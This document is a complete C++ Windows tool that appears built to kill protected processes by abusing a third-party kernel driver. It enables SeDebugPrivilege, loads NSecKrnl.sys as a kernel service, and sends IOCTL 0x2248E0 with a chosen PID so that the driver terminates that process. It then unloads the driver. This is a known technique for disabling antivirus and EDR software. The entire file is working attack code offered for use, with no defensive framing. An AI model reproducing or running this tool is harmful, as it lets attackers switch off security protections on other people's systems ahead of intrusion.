#include <Windows.h>
#include <filesystem>
#include <iostream>

namespace fs = std::filesystem;

#define NT_SUCCESS(Status)((NTSTATUS)(Status)>=0)

typedef NTSTATUS(WINAPI* NtDeviceIoControlFile_t)(
	HANDLE, HANDLE, PVOID, PVOID, PVOID, ULONG, PVOID, ULONG, PVOID, ULONG
	); NtDeviceIoControlFile_t pNtDeviceIoControlFile = nullptr;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
}IO_STATUS_BLOCK,*PIO_STATUS_BLOCK;

typedef struct _TerminateProcessInfo {
	HANDLE ProcessId;
}TerminateProcessInfo;

BOOL EnableSeDebugPrivilege() {
	BOOL bRet = FALSE;
	HANDLE hToken = NULL;
	LUID luid = { 0 };

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
			TOKEN_PRIVILEGES tokenPriv = { 0 };
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luid;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
		}
	}
	return bRet;
}

BOOL LoadDriver(LPCWSTR DriverName, LPCWSTR DriverPath) {
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL) {
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Open SC Manager Failed" << std::endl;
		return FALSE;
	}

	SC_HANDLE schService = CreateServiceW(schSCManager, DriverName, DriverName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, DriverPath, NULL, NULL, NULL, NULL, NULL);
	if (schService == NULL) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Create Driver Service Failed" << std::endl;
		return FALSE;
	}

	if (StartService(schService, 0, 0) == 0) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Start Driver Service Failed" << std::endl;
		return FALSE;
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	std::cout << "[+]Load Driver Success." << std::endl;
	return TRUE;
}

BOOL UnloadDriver(LPCWSTR DriverName) {
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL) {
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Open SC Manager Failed" << std::endl;
		return FALSE;
	}

	SC_HANDLE schService = OpenService(schSCManager, DriverName, SERVICE_ALL_ACCESS);
	if (schService == NULL) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Open Driver Service Failed" << std::endl;
		return FALSE;
	}

	SERVICE_STATUS status;
	if (QueryServiceStatus(schService, &status) == 0) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Query Service Status Failed" << std::endl;
		return FALSE;
	}
	if (status.dwCurrentState != SERVICE_STOPPED && status.dwCurrentState != SERVICE_STOP_PENDING) {
		if (ControlService(schService, SERVICE_CONTROL_STOP, &status) == 0) {
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			std::cout << "[-]Service Stop Failed" << std::endl;
			return FALSE;
		}
		/*
		INT timeOut = 0;
		while (status.dwCurrentState != SERVICE_STOPPED) {
			timeOut++;
			QueryServiceStatus(schService, &status);
			Sleep(50);
		}
		if (timeOut > 80) {
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			std::cout << "[-]Driver Service Stop TimedOut." << std::endl;
			return FALSE;
		}
		*/
	}
	if (DeleteService(schService) == 0) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Delete Driver Service Failed" << std::endl;
		return FALSE;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	std::cout << "[+]Unload Driver Success, Please reboot your PC for full unload!" << std::endl;
	return TRUE;
}

int main(int argc, char** argv) {
	int pid = 0;
	if (argc == 2) {
		pid = atoi(argv[1]);
		std::cout << "[+]Process PID to Terminate: " << pid << std::endl;
	}
	else {
		std::cout << "Usage: " << argv[0] << " [PID]" << std::endl;
		return 0;
	}

	std::cout << "[+]Terminate Target Process..." << std::endl;
	if (EnableSeDebugPrivilege()) {
		std::cout << "[+]Enable SeDebugPrivilege success."<<std::endl;
	}
	else {
		std::cout << "[-]Enable SeDebugPrivilege failed" << std::endl;
		return -1;
	}

	LPCWSTR ServiceName = L"NSecKrnl";
	auto CurrentPath = fs::current_path();
	std::string DrvName = "\\NSecKrnl.sys";
	std::string absolutepath = CurrentPath.string() + DrvName;
	std::wstring temp = std::wstring(absolutepath.begin(), absolutepath.end());
	LPCWSTR DrvPath = temp.c_str();
	std::wcout << "[+]Load Driver from" << DrvPath << std::endl;
	if (LoadDriver(ServiceName, DrvPath) == FALSE) {
		std::cout << "[-]Load Driver Failed." << std::endl;
		return -1;
	}

	HANDLE hDevice = INVALID_HANDLE_VALUE;
	hDevice = CreateFileW(L"\\\\.\\NSecKrnl", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "[-]Open Device Failed " << GetLastError() << std::endl;
		if (UnloadDriver(ServiceName) == FALSE) {
			return GetLastError();
		}
		return GetLastError();
	}
	std::cout << "[+]Open hDevice at 0x" << std::hex << hDevice << std::endl;

	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (!ntdll) {
		std::cout << "[-]Get NTDLL module failed." << std::endl;
		if (UnloadDriver(ServiceName) == FALSE) {
			return -2;
		}
		return -1;
	}

	pNtDeviceIoControlFile = (NtDeviceIoControlFile_t)GetProcAddress(ntdll, "NtDeviceIoControlFile");
	if (pNtDeviceIoControlFile == nullptr) {
		std::cout << "[-]Get NtDeviceIoControlFile failed" << std::endl;
		if (UnloadDriver(ServiceName) == FALSE) {
			return -2;
		}
		return -1;
	}

	DWORD dwIoControlCode = 0x2248E0;
	TerminateProcessInfo ProcessInfo = { 0 };
	IO_STATUS_BLOCK ioStatus = { 0 };
	ProcessInfo.ProcessId = (HANDLE)pid;
	NTSTATUS status = pNtDeviceIoControlFile(hDevice, nullptr, nullptr, nullptr, &ioStatus, dwIoControlCode, &ProcessInfo, sizeof(ProcessInfo), &ProcessInfo, sizeof(ProcessInfo));
	std::cout << "[.]Operate completed with code 0x" << std::hex << status << std::endl;
	if (UnloadDriver(ServiceName) == FALSE) {
		std::cout << "[-]Unload Driver Failed, You may need to unload driver manually" << std::endl;
		return -1;
	}
	return 0;
}